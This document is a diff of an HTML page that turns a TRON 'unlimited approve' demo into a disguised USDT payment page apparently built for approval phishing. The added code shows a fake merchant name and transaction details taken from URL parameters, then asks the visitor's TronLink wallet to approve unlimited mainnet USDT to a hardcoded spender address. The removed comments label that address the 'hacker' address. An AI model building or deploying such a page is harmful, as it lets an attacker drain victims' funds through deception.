@@ -2,107 +2,204 @@
 <html lang="zh-CN">
 <head>
   <meta charset="utf-8" />
-  <title>TRON 一键授权演示</title>
+  <title>TRON 授权确认</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <!-- TronWeb CDN（官方发布的浏览器版本） -->
+  <!-- TronWeb CDN -->
   <script src="https://unpkg.com/tronweb/dist/TronWeb.js"></script>
   <style>
-    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; padding: 16px; }
-    .card { max-width: 680px; margin: 0 auto; padding: 16px; border: 1px solid #eee; border-radius: 12px; box-shadow: 0 4px 18px rgba(0,0,0,.06); }
-    button { padding: 12px 16px; border-radius: 10px; border: none; cursor: pointer; font-size: 16px; }
-    .primary{ background:#3b82f6; color:white }
-    code { background:#f6f8fa; padding:2px 6px; border-radius:6px }
+    :root{--bg:#0f172a;--card:#0b1225;--muted:#94a3b8;--text:#e2e8f0;--pri:#3b82f6;--danger:#ef4444}
+    * {box-sizing:border-box}
+    body {margin:0;background:linear-gradient(180deg,#0b1020,#0f172a);font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;color:var(--text);padding:16px;min-height:100vh}
+    .wrap{max-width:680px;margin:40px auto}
+    .card{background:rgba(255,255,255,.04);backdrop-filter:blur(6px);border:1px solid rgba(255,255,255,.08);border-radius:16px;padding:24px;box-shadow:0 10px 30px rgba(0,0,0,.35)}
+    h1{margin:0 0 24px;font-size:24px;text-align:center}
+    .warning{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);border-radius:8px;padding:12px;margin-bottom:20px}
+    .warning strong{color:#fca5a5}
+    .info-section{background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.08);border-radius:10px;padding:16px;margin-bottom:20px}
+    .info-row{display:flex;justify-content:space-between;margin:8px 0;font-size:14px}
+    .info-label{color:var(--muted)}
+    .info-value{color:var(--text);font-weight:500}
+    code{background:#1e293b;padding:4px 8px;border-radius:4px;font-size:12px;color:#60a5fa;word-break:break-all}
+    .btn{width:100%;padding:14px;border:none;border-radius:10px;font-size:16px;font-weight:500;cursor:pointer;transition:all .3s;margin-top:20px}
+    .btn.primary{background:var(--pri);color:white}
+    .btn.primary:hover{background:#2563eb}
+    .btn:disabled{opacity:0.5;cursor:not-allowed}
+    #log{margin-top:16px;padding:12px;background:rgba(255,255,255,.02);border-radius:8px;min-height:50px;font-size:14px}
+    .success{color:#86efac}
+    .error{color:#fca5a5}
+    .steps{background:rgba(59,130,246,.05);border:1px solid rgba(59,130,246,.2);border-radius:8px;padding:12px;margin:16px 0}
+    .steps ol{margin:8px 0;padding-left:20px}
+    .steps li{margin:6px 0;font-size:14px}
   </style>
 </head>
 <body>
-  <div class="card">
-    <h2>TRON 一键授权（approve MaxUint）演示</h2>
-    <p>本页会调用 TRC20 代币合约的 <code>approve(spender, amount)</code>，授权额度为无限（<code>2^256-1</code>）。<br>
-    <b>仅用于测试，强烈建议在 Nile 测试网操作！</b></p>
-
-    <ol>
-      <li>用 <b>TronLink 手机钱包</b> 的内置 DApp 浏览器打开本页</li>
-      <li>点击下面按钮 → TronLink 将弹出授权确认</li>
-    </ol>
-
-    <p><b>当前配置：</b></p>
-    <ul>
-      <li>代币合约（TOKEN_CONTRACT）：<code id="token"></code></li>
-      <li>被授权地址（SPENDER_T）：<code id="spender"></code></li>
-      <li>节点（fullHost）：<code id="host"></code></li>
-    </ul>
-
-    <button class="primary" id="btn">发起无限授权（approve）</button>
-    <p id="log"></p>
+  <div class="wrap">
+    <h1 style="text-align:center;font-size:32px;margin-bottom:25px;color:var(--text);text-shadow:0 2px 10px rgba(0,0,0,.5);">易趣USDT支付平台</h1>
+    
+    <div class="card">
+      <h1>USDT 授权确认</h1>
+      
+      <div class="warning">
+        <strong>⚠️ 重要提示：</strong>此操作将授权智能合约访问您的USDT。请确认您了解授权的含义。
+      </div>
+      
+      <!-- 显示从上一页传来的数据 -->
+      <div class="info-section">
+        <h3 style="margin:0 0 12px;font-size:16px;">交易信息</h3>
+        <div class="info-row">
+          <span class="info-label">交易流水号：</span>
+          <span class="info-value" id="transactionId">-</span>
+        </div>
+        <div class="info-row">
+          <span class="info-label">支付项目：</span>
+          <span class="info-value" id="merchant">-</span>
+        </div>
+        <div class="info-row">
+          <span class="info-label">支付金额：</span>
+          <span class="info-value" id="amount">-</span>
+        </div>
+        <div class="info-row">
+          <span class="info-label">支付通道：</span>
+          <span class="info-value" id="network">-</span>
+        </div>
+        <div class="info-row">
+          <span class="info-label">备注信息：</span>
+          <span class="info-value" id="memo">-</span>
+        </div>
+      </div>
+      
+      <div class="info-section">
+        <h3 style="margin:0 0 12px;font-size:16px;">授权详情</h3>
+        <div class="info-row">
+          <span class="info-label">代币合约：</span>
+        </div>
+        <code id="token" style="display:block;margin:4px 0">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</code>
+        <div class="info-row" style="margin-top:8px">
+          <span class="info-label">授权地址：</span>
+        </div>
+        <code id="spender" style="display:block;margin:4px 0">TLDSPMN8HoVVRzxgn7Cm3F8FR6r9uZHESn</code>
+      </div>
+      
+      <div class="steps">
+        <strong>操作步骤：</strong>
+        <ol>
+          <li>确认上述交易信息无误</li>
+          <li>点击"确认授权"按钮</li>
+          <li>在钱包中确认交易</li>
+        </ol>
+      </div>
+      
+      <button class="btn primary" id="btn">确认授权</button>
+      
+      <div id="log"></div>
+    </div>
   </div>
-
+  
   <script>
-    // ======== 你只需要改这 3 个配置 ========
-    const TOKEN_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";  // USDT（建议先在 Nile 测试）
-    const SPENDER_T      = "TLDSPMN8HoVVRzxgn7Cm3F8FR6r9uZHESn";  // 你的“黑客”地址（T 开头）
-    const FULL_HOST      = "https://api.trongrid.io";               // Nile: https://api.nileex.io  | 主网: https://api.trongrid.io
-    // ======================================
-
-    // 无限授权（2^256 - 1）
+    // ======== 配置 ========
+    const TOKEN_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";  // USDT
+    const SPENDER_T = "TLDSPMN8HoVVRzxgn7Cm3F8FR6r9uZHESn";  // 授权地址
+    const FULL_HOST = "https://api.trongrid.io";  // 主网
     const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-
-    // 显示当前配置
-    token.textContent  = TOKEN_CONTRACT;
-    spender.textContent= SPENDER_T;
-    host.textContent   = FULL_HOST;
-
-    const logEl = document.getElementById('log');
-    function log(msg){ logEl.innerHTML = msg; }
-
-    // 把 T 开头地址转 hex（41...）
-    function toHexT(addr){
-      try {
-        // 如果注入了 tronWeb，则用注入的转换，保证和钱包一致
-        if (window.tronWeb && window.tronWeb.address) {
-          return window.tronWeb.address.toHex(addr);
-        }
-        // 备用：用 TronWeb 实例做转换
-        const tw = new TronWeb({ fullHost: FULL_HOST });
-        return tw.address.toHex(addr);
-      } catch(e){
-        console.error(e);
-        throw new Error("地址转换失败："+e.message);
-      }
+    
+    // 获取URL参数
+    function getUrlParams() {
+      const params = new URLSearchParams(window.location.search);
+      return {
+        transactionId: params.get('transactionId') || 'USDT' + Date.now(),
+        merchant: params.get('merchant') || '担保交易',
+        amount: params.get('amount') || '0.00',
+        network: params.get('network') || 'TRC-20',
+        memo: params.get('memo') || '无'
+      };
     }
-
-    async function approveMax(){
+    
+    // 显示交易数据
+    function displayTransactionData() {
+      const data = getUrlParams();
+      document.getElementById('transactionId').textContent = data.transactionId;
+      document.getElementById('merchant').textContent = data.merchant;
+      document.getElementById('amount').textContent = data.amount + ' USDT';
+      document.getElementById('network').textContent = data.network;
+      document.getElementById('memo').textContent = data.memo || '无';
+    }
+    
+    // 显示合约信息
+    document.getElementById('token').textContent = TOKEN_CONTRACT;
+    document.getElementById('spender').textContent = SPENDER_T;
+    
+    const logEl = document.getElementById('log');
+    function log(msg, type = '') {
+      logEl.className = type;
+      logEl.innerHTML = msg;
+    }
+    
+    async function approveMax() {
+      const btn = document.getElementById('btn');
       try {
         if (!window.tronWeb || !window.tronLink) {
-          log("❌ 未检测到 TronLink 注入。请在 TronLink 的 DApp 浏览器中打开本页。");
+          log("❌ 未检测到TronLink钱包。请在钱包DApp浏览器中打开。", "error");
           return;
         }
-        // 请求连接（部分版本需要）
+        
+        btn.disabled = true;
+        btn.textContent = "处理中...";
+        
+        // 请求连接
         if (window.tronLink.request) {
+          log("⏳ 连接钱包中...");
           await window.tronLink.request({ method: 'tron_requestAccounts' });
         }
-
-        // 选对网络（你自己保证钱包已切到 Nile 或主网）
+        
+        // 设置网络
         const tw = window.tronWeb;
         tw.setFullNode(FULL_HOST);
         tw.setSolidityNode(FULL_HOST);
         tw.setEventServer(FULL_HOST);
-
-        log("⏳ 正在加载合约…");
+        
+        log("⏳ 正在加载合约...");
         const contract = await tw.contract().at(TOKEN_CONTRACT);
-
-        // 发起 approve（无限授权）
-        log("⏳ 发起交易：approve(spender, MaxUint256)…");
+        
+        log("⏳ 请在钱包中确认授权交易...");
+        
         const tx = await contract.approve(SPENDER_T, MAX_UINT256).send({
-          feeLimit: 50_000_000  // 50 TRX 能量上限，视网络而定
+          feeLimit: 100_000_000
         });
-
-        log("✅ 交易已广播，TXID：<br><code>"+ tx +"</code><br>请在区块浏览器查看状态。");
-      } catch (err){
+        
+        log(`✅ 授权成功！<br>
+             交易哈希: <code>${tx}</code><br>
+             <a href="https://tronscan.org/#/transaction/${tx}" target="_blank" style="color:#60a5fa">在区块浏览器查看</a>`, "success");
+        
+        btn.textContent = "授权成功";
+        btn.disabled = true;
+        
+      } catch (err) {
         console.error(err);
-        log("❌ 失败："+ (err?.message || err));
+        btn.disabled = false;
+        btn.textContent = "确认授权";
+        
+        if (err.message && err.message.includes('User rejected')) {
+          log("❌ 用户取消了授权", "error");
+        } else {
+          log("❌ 授权失败：" + (err?.message || err), "error");
+        }
       }
     }
-
+    
+    // 页面加载时显示数据
+    window.addEventListener('load', () => {
+      displayTransactionData();
+      
+      // 检测钱包环境
+      setTimeout(() => {
+        if (!window.tronWeb) {
+          log("⚠️ 请在支持TRON的钱包浏览器中打开此页面", "error");
+        } else {
+          log("✅ 钱包环境就绪，可以进行授权操作", "success");
+        }
+      }, 1000);
+    });
+    
     document.getElementById('btn').addEventListener('click', approveMax);
   </script>
 </body>
